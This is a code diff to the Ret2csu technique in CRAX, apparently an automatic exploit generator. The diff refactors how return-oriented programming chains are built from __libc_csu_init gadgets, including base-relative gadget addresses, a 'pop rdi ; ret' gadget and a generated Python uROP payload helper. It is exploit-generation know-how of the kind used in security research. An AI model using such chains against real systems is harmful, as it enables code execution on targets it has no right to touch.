@@ -44,7 +44,7 @@ const std::string Ret2csu::s_libcCsuInitCallTarget = "__libc_csu_init_call_targe
 
 Ret2csu::Ret2csu(CRAX &ctx)
     : Technique(ctx),
-      m_addr(),
+      m_retAddr(),
       m_arg1(),
       m_arg2(),
       m_arg3(),
@@ -87,11 +87,11 @@ std::string Ret2csu::getAuxiliaryFunctions() const {
 }
 
 std::vector<SymbolicRopPayload> Ret2csu::getSymbolicRopPayloadList() const {
-    if (!m_addr) {
+    if (!m_retAddr) {
         return {};
     }
 
-    auto ret = getSymbolicRopPayloadList(m_addr, m_arg1, m_arg2, m_arg3);
+    auto ret = getSymbolicRopPayloadList(m_retAddr, m_arg1, m_arg2, m_arg3);
     ret[0].insert(ret[0].begin(), ConstantExpr::create(0x4141414141414141, Expr::Int64));
     return ret;
 }
@@ -105,23 +105,24 @@ std::string Ret2csu::toString() const {
 }
 
 
-std::vector<SymbolicRopPayload> Ret2csu::getSymbolicRopPayloadList(uint64_t addr,
-                                                                   uint64_t arg1,
-                                                                   uint64_t arg2,
-                                                                   uint64_t arg3) const {
+std::vector<SymbolicRopPayload>
+Ret2csu::getSymbolicRopPayloadList(const ref<Expr> &retAddr,
+                                   const ref<Expr> &arg1,
+                                   const ref<Expr> &arg2,
+                                   const ref<Expr> &arg3) const {
     SymbolicRopPayload rop;
 
     for (const ref<Expr> &e : m_symbolicRopPayloadList[0]) {
         if (auto phe = dyn_cast<PlaceholderExpr>(e)) {
             // If this expr is a placeholder, replace it now.
             if (phe->hasTag("arg1")) {
-                rop.push_back(ConstantExpr::create(arg1, Expr::Int64));
+                rop.push_back(arg1);
             } else if (phe->hasTag("arg2")) {
-                rop.push_back(ConstantExpr::create(arg2, Expr::Int64));
+                rop.push_back(arg2);
             } else if (phe->hasTag("arg3")) {
-                rop.push_back(ConstantExpr::create(arg3, Expr::Int64));
-            } else if (phe->hasTag("addr")) {
-                rop.push_back(ConstantExpr::create(addr, Expr::Int64));
+                rop.push_back(arg3);
+            } else if (phe->hasTag("retAddr")) {
+                rop.push_back(retAddr);
             } else {
                 throw UnhandledPlaceholderException();
             }
@@ -132,14 +133,27 @@ std::vector<SymbolicRopPayload> Ret2csu::getSymbolicRopPayloadList(uint64_t addr
     }
 
     // If arg1 cannot fit within EDI, chain the gadgets to set RDI.
-    if (arg1 >= (static_cast<uint64_t>(1) << 32)) {
+    if (BinaryExprEvaluator<uint64_t>().evaluate(arg1) >= (static_cast<uint64_t>(1) << 32)) {
         uint64_t gadgetAddr = m_ctx.getExploit().resolveGadget("pop rdi ; ret");
         rop.back() = ConstantExpr::create(gadgetAddr, Expr::Int64);
-        rop.push_back(ConstantExpr::create(arg1, Expr::Int64));
-        rop.push_back(ConstantExpr::create(addr, Expr::Int64));
+        rop.push_back(arg1);
+        rop.push_back(retAddr);
     }
 
     return {rop};
+}
+
+std::vector<SymbolicRopPayload>
+Ret2csu::getSymbolicRopPayloadList(uint64_t retAddr,
+                                   uint64_t arg1,
+                                   uint64_t arg2,
+                                   uint64_t arg3) const {
+    return getSymbolicRopPayloadList(
+        ConstantExpr::create(retAddr, Expr::Int64),
+        ConstantExpr::create(arg1, Expr::Int64),
+        ConstantExpr::create(arg2, Expr::Int64),
+        ConstantExpr::create(arg3, Expr::Int64)
+    );
 }
 
 void Ret2csu::parseLibcCsuInit() {
@@ -158,7 +172,8 @@ void Ret2csu::parseLibcCsuInit() {
             continue;
         }
 
-        m_libcCsuInitGadget1 = insns[i + 1].address;
+        m_libcCsuInitGadget1
+            = insns[i + 1].address - m_ctx.getExploit().getElf().getBase();
 
         m_gadget1Regs.reserve(7);
         for (int j = i + 1; j < i + 8; j++) {
@@ -187,7 +202,8 @@ void Ret2csu::parseLibcCsuInit() {
         assert(insns[i - 2].mnemonic == "mov");
         assert(insns[i - 3].mnemonic == "mov");
 
-        m_libcCsuInitGadget2 = insns[i].address - 3 * X86_64_MOV_INSN_LEN;
+        m_libcCsuInitGadget2
+            = insns[i].address - 3 * X86_64_MOV_INSN_LEN - m_ctx.getExploit().getElf().getBase();
 
         for (int j = i - 3; j < i; j++) {
             const std::string &opStr = insns[j].opStr;
@@ -211,7 +227,7 @@ void Ret2csu::parseLibcCsuInit() {
 }
 
 void Ret2csu::searchGadget2CallTarget(std::string funcName) {
-    uint64_t funcAddr = m_ctx.getExploit().getElf().symbols()[funcName];
+    uint64_t funcAddr = m_ctx.getExploit().getElf().getRuntimeAddress(funcName);
     std::vector<uint8_t> funcAddrBytes(8);
 
     std::memcpy(funcAddrBytes.data(), &funcAddr, sizeof(funcAddr));
@@ -222,7 +238,8 @@ void Ret2csu::searchGadget2CallTarget(std::string funcName) {
         return;
     }
 
-    m_libcCsuInitCallTarget = candidates[0];
+    // XXX: this only works for candidates in _DYNAMIC.
+    m_libcCsuInitCallTarget = candidates[0] - m_ctx.getExploit().getElf().getBase();
 }
 
 void Ret2csu::buildSymbolicRopPayloadList() {
@@ -241,7 +258,7 @@ void Ret2csu::buildSymbolicRopPayloadList() {
     SymbolicRopPayload &rop = m_symbolicRopPayloadList[0];
 
     // XXX: gadget1 is not in elf.sym
-    rop.push_back(BaseOffsetExpr::create(m_ctx.getExploit(), s_libcCsuInitGadget1));
+    rop.push_back(BaseOffsetExpr::create(m_ctx.getExploit(), "", s_libcCsuInitGadget1));
     for (int i = 0; i < 7; i++) {
         std::string content = transform[m_gadget1Regs[i]];
 
@@ -251,14 +268,14 @@ void Ret2csu::buildSymbolicRopPayloadList() {
             uint64_t val = std::stoull(content, nullptr, 16);
             rop.push_back(ConstantExpr::create(val, Expr::Int64));
         } else {
-            rop.push_back(BaseOffsetExpr::create(m_ctx.getExploit(), content));
+            rop.push_back(BaseOffsetExpr::create(m_ctx.getExploit(), "", content));
         }
     }
-    rop.push_back(BaseOffsetExpr::create(m_ctx.getExploit(), s_libcCsuInitGadget2));
+    rop.push_back(BaseOffsetExpr::create(m_ctx.getExploit(), "", s_libcCsuInitGadget2));
     for (int i = 0; i < 7; i++) {
         rop.push_back(ConstantExpr::create(0x4141414141414141, Expr::Int64));
     }
-    rop.push_back(PlaceholderExpr::create("addr"));
+    rop.push_back(PlaceholderExpr::create("retAddr"));
 }
 
 void Ret2csu::buildAuxiliaryFunction() {
@@ -280,7 +297,7 @@ void Ret2csu::buildAuxiliaryFunction() {
         }
     }
 
-    f  = "def uROP(addr, arg1, arg2, arg3) -> bytes:\n" + f;
+    f  = "def uROP(retAddr, arg1, arg2, arg3) -> bytes:\n" + f;
     f += "    return payload";
     m_auxiliaryFunction = std::move(f);
 }
